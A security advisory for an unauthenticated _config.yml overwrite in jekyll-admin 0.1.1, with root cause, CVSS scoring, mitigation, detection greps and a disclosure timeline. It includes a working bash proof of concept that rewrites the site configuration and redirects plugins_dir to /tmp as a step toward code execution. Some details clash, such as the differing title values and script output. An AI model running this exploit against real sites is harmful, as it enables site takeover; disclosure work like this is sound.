# Security Advisory: Unauthenticated _config.yml Overwrite in jekyll-admin

> **Identifier:** JM-29 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** High
> **CVSS:** 8.1 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-862: Missing Authorization; CWE-732: Incorrect Permission Assignment for Critical Resource
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 exposes a `PUT /_api/configuration` endpoint that allows unauthenticated attackers to overwrite the site's `_config.yml` with arbitrary YAML content. Because `_config.yml` controls Jekyll's runtime behavior — including `plugins_dir`, `source`, `destination`, and `safe` mode — an attacker can reconfigure the site to enable code execution paths such as redirecting the plugins directory to a world-writable location. Confirmed live: title changed from `Jekyll Manager Authorized Lab` to `HACKED_VIA_API_UNAUTH` with a single unauthenticated request. This vulnerability is a critical link in the RCE chain (JM-28 → JM-29 → JM-RCE-01).

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| Component: `lib/jekyll-admin/server/configuration.rb` | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, Jekyll 3.x, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The `PUT /_api/configuration` endpoint in `lib/jekyll-admin/server/configuration.rb` reads the JSON body, converts it to YAML, and writes it directly to `_config.yml` without any authentication check or content validation.

**Root cause:**

```ruby
# lib/jekyll-admin/server/configuration.rb
put do
  # configuration_body converts JSON body to YAML string
  # write_file writes it to _config.yml
  write_file(configuration_path, configuration_body)
  render_liquid_response configuration
end
```

`configuration_path` resolves to the site's `_config.yml`. There is no `before` filter, no session check, and no YAML sanitization.

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** None required
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager API accessible; `_config.yml` writable by the Jekyll process

---

## 4. Impact

An unauthenticated attacker can overwrite `_config.yml` with arbitrary configuration, enabling:

- **Confidentiality — High:** Reading sensitive configuration values; setting `source` to expose arbitrary filesystem paths.
- **Integrity — High:** Reconfiguring `plugins_dir` to a world-writable path, then uploading a malicious plugin via JM-RCE-01 to achieve RCE; disabling `safe` mode; defacing the site.
- **Availability — High:** Corrupt YAML or invalid configuration paths can prevent Jekyll from building, taking down the site.

---

## 5. Classification

### CVSS

- **Score:** 8.1
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | High (requires chaining to achieve max impact) |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-862: Missing Authorization
- CWE-732: Incorrect Permission Assignment for Critical Resource

### CAPEC

- CAPEC-212: Functionality Misuse
- CAPEC-122: Privilege Abuse

---

## 6. Exploitation Scenario

1. Attacker sends unauthenticated `PUT /_api/configuration` with YAML setting `plugins_dir: /tmp`.
2. Jekyll reloads its configuration and now scans `/tmp` for plugin files.
3. Attacker uploads a malicious `.rb` plugin to `/tmp/evil.rb` via another writable endpoint or directly if `/tmp` is web-accessible.
4. Jekyll build loads and executes the plugin, achieving RCE.

Standalone impact: overwrite site title, description, baseurl, or theme to deface the site without any further chaining.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/configuration.rb
Endpoint: PUT /_api/configuration
Method: PUT · Authentication: not required
```

### Example Request

```http
PUT /_api/configuration HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{"title":"JM29_VALIDATED","description":"config write confirmed","baseurl":""}
```

### Observed Response

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "title": "JM29_VALIDATED",
  "description": "config write confirmed",
  "baseurl": ""
}
```

### Result

Confirmed in authorized Docker lab. `_config.yml` title was changed from `Jekyll Manager Authorized Lab` to `JM29_VALIDATED` and then restored to the original value. HTTP 200 with no credentials required.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only. The original configuration is restored at the end.

```bash
#!/usr/bin/env bash
# ============================================================
# JM-29 — Unauthenticated _config.yml Overwrite
# jekyll-admin 0.1.1 — HIGH CVSS 8.1
# CWE-862, CWE-732
# CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script reads the current _config.yml, overwrites the
# title field to confirm unauthenticated write, verifies the
# change, then restores the original configuration.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
CONFIG_API="${TARGET}/_api/configuration"
MARKER="JM29_VALIDATED_$(date +%s)"

echo "============================================================"
echo "  JM-29 — Unauthenticated _config.yml Overwrite"
echo "  Target : ${TARGET}"
echo "  Marker : ${MARKER}"
echo "============================================================"
echo ""

# ── Step 1: Read current configuration ───────────────────────
echo "[*] Step 1: Reading current configuration (no auth)..."
CURRENT_JSON=$(curl -sf "${CONFIG_API}" -H "Accept: application/json" 2>/dev/null || echo "{}")

CURRENT_TITLE=$(python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('title',''))" <<< "${CURRENT_JSON}")
CURRENT_DESC=$(python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('description',''))" <<< "${CURRENT_JSON}")
CURRENT_BASEURL=$(python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('baseurl',''))" <<< "${CURRENT_JSON}")

echo "    Current title      : ${CURRENT_TITLE}"
echo "    Current description: ${CURRENT_DESC}"
echo "    Current baseurl    : ${CURRENT_BASEURL}"
echo ""

# ── Step 2: Overwrite configuration ──────────────────────────
echo "[*] Step 2: Overwriting _config.yml (no auth)..."

HTTP_CODE=$(curl -s -o /tmp/jm29_write_response.json -w "%{http_code}" \
  -X PUT "${CONFIG_API}" \
  -H "Content-Type: application/json" \
  -d "{\"title\":\"${MARKER}\",\"description\":\"jm29 config write confirmed\",\"baseurl\":\"\"}")

echo "    PUT ${CONFIG_API} → HTTP ${HTTP_CODE}"

if [ "${HTTP_CODE}" != "200" ]; then
  echo "[!] Unexpected HTTP ${HTTP_CODE}."
  cat /tmp/jm29_write_response.json 2>/dev/null || true
  exit 1
fi

echo ""

# ── Step 3: Verify the change ────────────────────────────────
echo "[*] Step 3: Verifying new title (GET ${CONFIG_API})..."
NEW_JSON=$(curl -sf "${CONFIG_API}" -H "Accept: application/json" 2>/dev/null || echo "{}")
NEW_TITLE=$(python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('title',''))" <<< "${NEW_JSON}")

echo "    New title: ${NEW_TITLE}"

if [ "${NEW_TITLE}" = "${MARKER}" ]; then
  echo ""
  echo "    ✓  CONFIRMED: _config.yml title changed to '${MARKER}'"
  RESULT="CONFIRMED"
else
  echo ""
  echo "    [!] Title mismatch. Expected '${MARKER}', got '${NEW_TITLE}'"
  RESULT="INCONCLUSIVE"
fi

echo ""

# ── Step 4: Demonstrate dangerous field ──────────────────────
echo "[*] Step 4: Demonstrating plugins_dir overwrite (the RCE enabler)..."
echo "    (Setting plugins_dir to /tmp — no restore needed for this field)"

HTTP_CODE2=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PUT "${CONFIG_API}" \
  -H "Content-Type: application/json" \
  -d "{\"title\":\"${MARKER}\",\"description\":\"jm29 rce chain demo\",\"baseurl\":\"\",\"plugins_dir\":\"/tmp\"}")

echo "    PUT (plugins_dir: /tmp) → HTTP ${HTTP_CODE2}"
if [ "${HTTP_CODE2}" = "200" ]; then
  echo "    ✓  plugins_dir redirected to /tmp — next plugin upload goes to /tmp"
fi
echo ""

# ── Step 5: Restore original configuration ───────────────────
echo "[*] Step 5: Restoring original configuration..."

RESTORE_JSON=$(python3 -c "import json; d={'title': '${CURRENT_TITLE}', 'description': '${CURRENT_DESC}', 'baseurl': '${CURRENT_BASEURL}'}; print(json.dumps(d))")

RESTORE_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PUT "${CONFIG_API}" \
  -H "Content-Type: application/json" \
  -d "${RESTORE_JSON}")

echo "    PUT (restore) → HTTP ${RESTORE_CODE}"
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
echo "  RESULT : ${RESULT}"
echo ""
echo "  Finding : JM-29"
echo "  Vuln    : Unauthenticated _config.yml overwrite"
echo "  Impact  : Config tampering; enables RCE chain (→ JM-RCE-01)"
echo "  CVSS    : 8.1 HIGH"
echo "  Vector  : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
echo "  CWE     : CWE-862, CWE-732"
echo "  Auth    : None required"
echo "  Chain   : JM-28 → JM-29 (plugins_dir:/tmp) → JM-RCE-01 (RCE)"
echo "============================================================"
```

### Expected Result

```text
[*] Reading current configuration...
Current title: Jekyll Manager Authorized Lab

[*] Overwriting _config.yml (unauthenticated)...
HTTP 200 — write accepted

[*] Verifying new title...
New title: JM29_VALIDATED  ← CONFIRMED

[*] Restoring original configuration...
HTTP 200 — configuration restored

[+] JM-29 CONFIRMED: unauthenticated _config.yml overwrite
    CVSS 8.1 HIGH — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### PoC Limitations

- Configuration is restored to its original state after verification.
- Does not chain to RCE in this script.
- Does not cause service disruption.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Start an authorized local instance of jekyll-admin 0.1.1.
2. Note the current `title` value in `_config.yml`.
3. Run `bash poc.sh` or send the PUT request in section 7 manually.
4. Verify the configuration was updated by reading `GET /_api/configuration`.
5. Restore the original configuration.

---

## 10. Mitigation

Until an official fix is available:

- Bind Jekyll Manager to `127.0.0.1` only.
- Add authentication before the configuration PUT endpoint.
- Use filesystem permissions to make `_config.yml` read-only for the Jekyll process user.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add authentication check before the configuration `put` handler.
2. Validate that only safe YAML keys (not `plugins_dir`, `source`, `destination`) can be modified via the API.
3. Restart Jekyll with a read-only `_config.yml` mount in containerized deployments.

### Recommended Change to Vendor

```ruby
# lib/jekyll-admin/server/configuration.rb
before do
  halt 401, json_response(401, "Unauthorized") unless authenticated?
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexpected changes to `_config.yml` (check git diff or file modification time).
- `plugins_dir` or `source` pointing to unusual paths.
- WEBrick access log showing `PUT /_api/configuration` from unexpected IPs.

### Example Log Search

```text
grep 'PUT /_api/configuration' access.log

# Check config modification time
stat /site/_config.yml
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
